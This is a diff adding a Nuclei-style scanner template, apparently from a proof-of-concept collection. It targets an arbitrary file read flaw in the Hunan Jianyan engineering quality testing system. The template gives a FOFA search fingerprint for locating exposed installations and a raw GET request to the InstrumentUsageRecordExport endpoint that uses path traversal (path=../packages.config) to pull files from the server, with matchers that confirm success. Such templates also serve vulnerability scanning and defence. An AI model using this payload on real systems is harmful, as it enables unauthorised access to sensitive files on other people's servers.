@@ -1,0 +1,24 @@
+id: hunan-jianyan-test-instrumentusagerecordexport-file-read
+
+info:
+  name: "湖南建研工程质量检测系统 InstrumentUsageRecordExport 接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/Content/Theme/Standard/webSite/login.css"
+          湖南建研工程质量检测系统 InstrumentUsageRecordExport 接口存在任意文件读取安全缺陷，攻击者可利用该漏洞读取任意文件，导致敏感信息泄露
+  tags: 湖南建研工程质量检测系统
+
+http:
+- raw:
+  - |
+    GET /Applications/Forms/Custom/InstrumentUsageRecordExport.cshtml?act=down&path=../packages.config HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'attachment'
